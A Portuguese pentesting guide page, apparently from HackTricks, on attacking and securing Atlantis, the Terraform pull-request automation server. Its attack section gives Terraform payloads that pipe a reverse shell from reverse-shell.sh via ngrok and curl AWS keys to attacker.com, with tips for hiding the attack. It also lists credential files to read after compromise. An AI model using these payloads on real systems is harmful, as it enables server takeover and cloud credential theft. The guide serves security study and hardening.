# Seguran√ßa do Atlantis

<details>

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking na GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

O Atlantis basicamente ajuda voc√™ a executar o terraform a partir de Pull Requests do seu servidor git.

![](<../.gitbook/assets/image (161).png>)

## Laborat√≥rio Local

1. Acesse a **p√°gina de lan√ßamentos do atlantis** em [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) e **baixe** o que mais lhe convier.
2. Crie um **token pessoal** (com acesso ao reposit√≥rio) do seu usu√°rio **github**
3. Execute `./atlantis testdrive` e ele criar√° um **reposit√≥rio de demonstra√ß√£o** que voc√™ pode usar para **conversar com o atlantis**
1. Voc√™ pode acessar a p√°gina da web em 127.0.0.1:4141

## Acesso ao Atlantis

### Credenciais do Servidor Git

O **Atlantis** suporta v√°rios hosts git como **Github**, **Gitlab**, **Bitbucket** e **Azure DevOps**.\
No entanto, para acessar os reposit√≥rios nesses plataformas e realizar a√ß√µes, ele precisa ter algum **acesso privilegiado concedido a eles** (pelo menos permiss√µes de escrita).\
[**A documenta√ß√£o**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) incentiva a criar um usu√°rio nessas plataformas especificamente para o Atlantis, mas algumas pessoas podem usar contas pessoais.

{% hint style="warning" %}
De qualquer forma, do ponto de vista de um atacante, a **conta do Atlantis** ser√° muito **interessante de comprometer**.
{% endhint %}

### Webhooks

O Atlantis usa opcionalmente [**Segredos de Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que os **webhooks** que recebe do seu host Git s√£o **leg√≠timos**.

Uma maneira de confirmar isso seria **permitir que as solicita√ß√µes venham apenas dos IPs** do seu host Git, mas uma maneira mais f√°cil √© usar um Segredo de Webhook.

Observe que, a menos que voc√™ use um servidor github ou bitbucket privado, ser√° necess√°rio expor os endpoints de webhook para a Internet.

{% hint style="warning" %}
O Atlantis vai estar **expondo webhooks** para que o servidor git possa enviar informa√ß√µes. Do ponto de vista de um atacante, seria interessante saber **se √© poss√≠vel enviar mensagens**.
{% endhint %}

### Credenciais do Provedor <a href="#provider-credentials" id="provider-credentials"></a>

[A partir da documenta√ß√£o:](https://www.runatlantis.io/docs/provider-credentials.html)

O Atlantis executa o Terraform simplesmente **executando os comandos `terraform plan` e `apply`** no servidor **em que o Atlantis est√° hospedado**. Assim como quando voc√™ executa o Terraform localmente, o Atlantis precisa de credenciais para o seu provedor espec√≠fico.

Depende de voc√™ como voc√™ [fornece credenciais](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para o seu provedor espec√≠fico ao Atlantis:

* O Chart do Atlantis [Helm](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) e o M√≥dulo [AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) t√™m seus pr√≥prios mecanismos para credenciais do provedor. Leia suas documenta√ß√µes.
* Se voc√™ estiver executando o Atlantis em uma nuvem, muitas nuvens t√™m maneiras de fornecer acesso √† API da nuvem para aplicativos em execu√ß√£o nelas, ex:
* [Fun√ß√µes EC2 da AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Procure por "Fun√ß√£o EC2")
* [Contas de Servi√ßo de Inst√¢ncia GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muitos usu√°rios definem vari√°veis de ambiente, ex. `AWS_ACCESS_KEY`, onde o Atlantis est√° em execu√ß√£o.
* Outros criam os arquivos de configura√ß√£o necess√°rios, ex. `~/.aws/credentials`, onde o Atlantis est√° em execu√ß√£o.
* Use o [Provedor HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obter credenciais do provedor.

{% hint style="warning" %}
O **cont√™iner** onde o **Atlantis** est√° **em execu√ß√£o** provavelmente **conter√° credenciais privilegiadas** para os provedores (AWS, GCP, Github...) que o Atlantis est√° gerenciando via Terraform.
{% endhint %}

### P√°gina da Web

Por padr√£o, o Atlantis executar√° uma **p√°gina da web na porta 4141 em localhost**. Esta p√°gina apenas permite que voc√™ habilite/desabilite o apply do atlantis e verifique o status do plano dos reposit√≥rios e desbloqueie-os (n√£o permite modificar coisas, ent√£o n√£o √© t√£o √∫til).

Provavelmente voc√™ n√£o a encontrar√° exposta na internet, mas parece que por padr√£o **n√£o s√£o necess√°rias credenciais** para acess√°-la (e se forem, `atlantis`:`atlantis` s√£o as **padr√£o**).

## Configura√ß√£o do Servidor

A configura√ß√£o do `atlantis server` pode ser especificada via flags de linha de comando, vari√°veis de ambiente, um arquivo de configura√ß√£o ou uma combina√ß√£o dos tr√™s.

* Voc√™ pode encontrar [**aqui a lista de flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) suportados pelo servidor Atlantis
* Voc√™ pode encontrar [**aqui como transformar uma op√ß√£o de configura√ß√£o em uma vari√°vel de ambiente**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Os valores s√£o **escolhidos nesta ordem**:

1. Flags
2. Vari√°veis de Ambiente
3. Arquivo de Configura√ß√£o

{% hint style="warning" %}
Observe que na configura√ß√£o voc√™ pode encontrar valores interessantes como **tokens e senhas**.
{% endhint %}

### Configura√ß√£o dos Reposit√≥rios

Algumas configura√ß√µes afetam **como os reposit√≥rios s√£o gerenciados**. No entanto, √© poss√≠vel que **cada reposit√≥rio exija configura√ß√µes diferentes**, ent√£o existem maneiras de especificar cada reposit√≥rio. Esta √© a ordem de prioridade:

1. Arquivo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Este arquivo pode ser usado para especificar como o atlantis deve tratar o reposit√≥rio. No entanto, por padr√£o, algumas chaves n√£o podem ser especificadas aqui sem algumas flags permitindo isso.
1. Provavelmente √© necess√°rio permitir por flags como `allowed_overrides` ou `allow_custom_workflows`
2. [**Configura√ß√£o do Lado do Servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Voc√™ pode pass√°-lo com a flag `--repo-config` e √© um yaml configurando novas configura√ß√µes para cada reposit√≥rio (regexes suportados)
3. Valores **padr√£o**
#### Prote√ß√µes de PR

O Atlantis permite indicar se deseja que o **PR** seja **`aprovado`** por outra pessoa (mesmo que n√£o esteja definido na prote√ß√£o do branch) e/ou seja **`mescl√°vel`** (prote√ß√µes do branch aprovadas) **antes de executar o apply**. Do ponto de vista da seguran√ßa, √© recomendado configurar ambas as op√ß√µes.

No caso de `allowed_overrides` ser True, essas configura√ß√µes podem ser **sobrescritas em cada projeto pelo arquivo `/atlantis.yml`**.

#### Scripts

A configura√ß√£o do reposit√≥rio pode **especificar scripts** para serem executados [**antes**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) e [**depois**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) da execu√ß√£o de um **workflow**.

N√£o h√° op√ß√£o para permitir **especificar** esses scripts no arquivo **`/atlantis.yml`** do reposit√≥rio.

#### Workflow

Na configura√ß√£o do reposit√≥rio (configura√ß√£o do lado do servidor) voc√™ pode [**especificar um novo fluxo de trabalho padr√£o**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**criar novos fluxos de trabalho personalizados**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Voc√™ tamb√©m pode **especificar** quais **reposit√≥rios** podem **acessar** os **novos** fluxos de trabalho gerados.\
Em seguida, voc√™ pode permitir que o arquivo **atlantis.yaml** de cada reposit√≥rio **especifique o fluxo de trabalho a ser usado**.

{% hint style="danger" %}
Se a flag [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver definida como **True**, os fluxos de trabalho podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m √© potencialmente necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **sobrescrever o fluxo de trabalho** que ser√° utilizado.\
Isso basicamente dar√° **RCE no servidor Atlantis para qualquer usu√°rio que possa acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Verifica√ß√£o de Pol√≠ticas Conftest

O Atlantis suporta a execu√ß√£o de **pol√≠ticas** [**conftest**](https://www.conftest.dev/) **no lado do servidor** contra a sa√≠da do plano. Casos de uso comuns para usar esta etapa incluem:

* Negar o uso de uma lista de m√≥dulos
* Afirmar atributos de um recurso no momento da cria√ß√£o
* Detectar exclus√µes n√£o intencionais de recursos
* Prevenir riscos de seguran√ßa (ou seja, expor portas seguras ao p√∫blico)

Voc√™ pode verificar como configur√°-lo na [**documenta√ß√£o**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Comandos do Atlantis

[**Na documenta√ß√£o**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) voc√™ pode encontrar as op√ß√µes que pode usar para executar o Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataques

{% hint style="warning" %}
Se durante a explora√ß√£o voc√™ encontrar este **erro**: `Error: Error acquiring the state lock`

Voc√™ pode corrigi-lo executando:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Plano de RCE do Atlantis - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita sobre um reposit√≥rio, voc√™ ser√° capaz de criar um novo branch nele e gerar um PR. Se voc√™ pode **executar `atlantis plan`** (ou talvez seja executado automaticamente) **voc√™ ser√° capaz de RCE dentro do servidor Atlantis**.

Voc√™ pode fazer isso fazendo [**o Atlantis carregar uma fonte de dados externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Apenas coloque um payload como o seguinte no arquivo `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Ataque mais Furtivo

Voc√™ pode realizar este ataque de forma ainda mais furtiva, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que contenha o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo rev shell do terraform em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Em vez** de criar um **PR para o master** para acionar o Atlantis, **crie 2 branches** (test1 e test2) e crie um **PR de um para o outro**. Quando tiver conclu√≠do o ataque, apenas **remova o PR e os branches**.

### Atlantis plan Secrets Dump

Voc√™ pode **dump secrets usados pelo terraform** executando `atlantis plan` (`terraform plan`) colocando algo assim no arquivo terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis aplica RCE - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita sobre um reposit√≥rio, voc√™ ser√° capaz de criar um novo branch nele e gerar um PR. Se voc√™ pode **executar `atlantis apply`, voc√™ ser√° capaz de RCE dentro do servidor Atlantis**.

No entanto, geralmente voc√™ precisar√° contornar algumas prote√ß√µes:

- **Mergeable**: Se essa prote√ß√£o estiver configurada no Atlantis, voc√™ s√≥ pode executar **`atlantis apply` se o PR for mergeable** (o que significa que a prote√ß√£o de branch precisa ser contornada).
- Verifique poss√≠veis [**burlas de prote√ß√£o de branch**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Aprovado**: Se essa prote√ß√£o estiver configurada no Atlantis, algum **outro usu√°rio deve aprovar o PR** antes de voc√™ poder executar `atlantis apply`
- Por padr√£o, voc√™ pode abusar do [**token Gitbot para contornar essa prote√ß√£o**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Executando **`terraform apply` em um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar esse ataque de uma maneira **mais furtiva**.

### Inje√ß√£o de Par√¢metros no Terraform

Ao executar `atlantis plan` ou `atlantis apply`, o terraform est√° sendo executado por baixo dos panos, voc√™ pode passar comandos para o terraform a partir do atlantis comentando algo como:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Algo que voc√™ pode passar s√£o vari√°veis de ambiente que podem ser √∫teis para contornar algumas prote√ß√µes. Verifique as vari√°veis de ambiente do Terraform em [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Fluxo de Trabalho Personalizado

Executando **comandos de compila√ß√£o personalizados maliciosos** especificados em um arquivo `atlantis.yaml`. O Atlantis usa o arquivo `atlantis.yaml` do branch de solicita√ß√£o de pull, **n√£o** do `master`.\
Essa possibilidade foi mencionada em uma se√ß√£o anterior:

{% hint style="danger" %}
Se a flag de configura√ß√£o do lado do servidor [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) estiver definida como **True**, fluxos de trabalho podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m √© potencialmente necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **sobrescrever o fluxo de trabalho** que ser√° usado.

Isso basicamente dar√° **RCE no servidor Atlantis para qualquer usu√°rio que possa acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Bypassar prote√ß√µes de plano/aplica√ß√£o

Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiver_ `apply_requirements` configurado, √© poss√≠vel para um reposit√≥rio **modificar as prote√ß√µes de plano/aplica√ß√£o para as bypassar**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Sequestro de PR

Se algu√©m enviar **coment√°rios `atlantis plan/apply` em suas solicita√ß√µes de pull v√°lidas,** far√° com que o terraform seja executado quando voc√™ n√£o quiser.

Al√©m disso, se voc√™ n√£o tiver configurado na **prote√ß√£o de branch** para pedir para **reevaluar** cada PR quando um **novo commit for enviado** para ele, algu√©m poderia **escrever configura√ß√µes maliciosas** (ver cen√°rios anteriores) no arquivo de configura√ß√£o do terraform, executar `atlantis plan/apply` e obter RCE.

Esta √© a **configura√ß√£o** nas prote√ß√µes de branch do Github:

![](<../.gitbook/assets/image (216).png>)

### Segredo do Webhook

Se voc√™ conseguir **roubar o segredo do webhook** usado ou se **n√£o houver nenhum segredo de webhook** sendo usado, voc√™ poderia **chamar o webhook do Atlantis** e **invocar comandos do atlantis** diretamente.

### Bitbucket

O Bitbucket Cloud **n√£o suporta segredos de webhook**. Isso poderia permitir que atacantes **falsifiquem solicita√ß√µes do Bitbucket**. Certifique-se de permitir apenas IPs do Bitbucket.

* Isso significa que um **atacante** poderia fazer **solicita√ß√µes falsas ao Atlantis** que parecem estar vindo do Bitbucket.
* Se voc√™ estiver especificando `--repo-allowlist`, ent√£o eles s√≥ poderiam falsificar solicita√ß√µes relacionadas a esses reposit√≥rios, ent√£o o m√°ximo de dano que poderiam causar seria planejar/aplicar em seus pr√≥prios reposit√≥rios.
* Para evitar isso, permita [os endere√ßos IP do Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (veja os endere√ßos IPv4 de sa√≠da).

## P√≥s-Explora√ß√£o

Se voc√™ conseguiu acessar o servidor ou pelo menos obteve um LFI, h√° algumas coisas interessantes que voc√™ deve tentar ler:

* `/home/atlantis/.git-credentials` Cont√©m credenciais de acesso ao VCS
* `/atlantis-data/atlantis.db` Cont√©m credenciais de acesso ao VCS com mais informa√ß√µes
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Arquivo de estado do Terraform
* Exemplo: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Vari√°veis de ambiente
* `/proc/[2-20]/cmdline` Linha de comando do `atlantis server` (pode conter dados sens√≠veis)

## Mitiga√ß√µes

### N√£o Use em Reposit√≥rios P√∫blicos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Porque qualquer pessoa pode comentar em solicita√ß√µes de pull p√∫blicas, mesmo com todas as mitiga√ß√µes de seguran√ßa dispon√≠veis, ainda √© perigoso executar o Atlantis em reposit√≥rios p√∫blicos sem a configura√ß√£o adequada das configura√ß√µes de seguran√ßa.

### N√£o Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Se voc√™ estiver executando em um reposit√≥rio p√∫blico (o que n√£o √© recomendado, veja acima), voc√™ n√£o deve definir `--allow-fork-prs` (padr√£o √© falso) porque qualquer pessoa pode abrir uma solicita√ß√£o de pull de seu fork para seu reposit√≥rio.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

O Atlantis requer que voc√™ especifique uma lista de permiss√µes de reposit√≥rios dos quais aceitar√° webhooks via a flag `--repo-allowlist`. Por exemplo:

* Reposit√≥rios espec√≠ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda a sua organiza√ß√£o: `--repo-allowlist=github.com/runatlantis/*`
* Todos os reposit√≥rios em sua instala√ß√£o do GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos os reposit√≥rios: `--repo-allowlist=*`. √ötil quando voc√™ est√° em uma rede protegida, mas perigoso sem tamb√©m definir um segredo de webhook.

Esta flag garante que sua instala√ß√£o do Atlantis n√£o esteja sendo usada com reposit√≥rios que voc√™ n√£o controla. Veja `atlantis server --help` para mais detalhes.

### Proteger o Planejamento do Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Se atacantes enviando solicita√ß√µes de pull com c√≥digo Terraform malicioso estiver em seu modelo de amea√ßa, voc√™ deve estar ciente de que as aprova√ß√µes de `terraform apply` n√£o s√£o suficientes. √â poss√≠vel executar c√≥digo malicioso em um `terraform plan` usando a [fonte de dados `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou especificando um provedor malicioso. Este c√≥digo poderia ent√£o extrair suas credenciais.

Para evitar isso, voc√™ poderia:

1. Incorporar provedores na imagem do Atlantis ou no host e negar a sa√≠da em produ√ß√£o.
2. Implementar o protocolo de registro de provedores internamente e negar a sa√≠da p√∫blica, dessa forma voc√™ controla quem tem acesso de grava√ß√£o ao registro.
3. Modificar a etapa `plan` da [configura√ß√£o do reposit√≥rio do lado do servidor](https://www.runatlantis.io/docs/server-side-repo-config.html) para validar contra o uso de provedores ou fontes de dados proibidos ou PRs de usu√°rios n√£o permitidos. Voc√™ tamb√©m poderia adicionar valida√ß√£o extra neste ponto, por exemplo, exigindo um "joinha" na PR antes de permitir que o `plan` continue. Conftest poderia ser √∫til aqui.

### Segredos do Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

O Atlantis deve ser executado com segredos de webhook definidos via as vari√°veis de ambiente `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Mesmo com a flag `--repo-allowlist` definida, sem um segredo de webhook, os atacantes poderiam fazer solicita√ß√µes ao Atlantis se passando por um reposit√≥rio que est√° na lista de permiss√µes. Os segredos do webhook garantem que as solicita√ß√µes do webhook realmente venham do seu provedor de VCS (GitHub ou GitLab).

Se voc√™ estiver usando o Azure DevOps, em vez de segredos de webhook, adicione um nome de usu√°rio e senha b√°sicos.

### Autentica√ß√£o B√°sica do Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

O Azure DevOps suporta o envio de um cabe√ßalho de autentica√ß√£o b√°sica em todos os eventos de webhook. Isso requer o uso de uma URL HTTPS para a localiza√ß√£o do seu webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Se voc√™ estiver usando segredos de webhook, mas seu tr√°fego √© via HTTP, ent√£o os segredos de webhook poderiam ser roubados. Habilite SSL/HTTPS usando as flags `--ssl-cert-file` e `--ssl-key-file`.

### Habilitar Autentica√ß√£o no Servidor Web do Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

√â altamente recomend√°vel habilitar a autentica√ß√£o no servi√ßo web. Ative o BasicAuth usando `--web-basic-auth=true` e configure um nome de usu√°rio e uma senha usando as flags `--web-username=seuNomeDeUsu√°rio` e `--web-password=suaSenha`.

Voc√™ tamb√©m pode passar essas informa√ß√µes como vari√°veis de ambiente `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=seuNomeDeUsu√°rio` e `ATLANTIS_WEB_PASSWORD=suaSenha`.

## Refer√™ncias

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Aprenda e pratique Hacking em AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking em GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
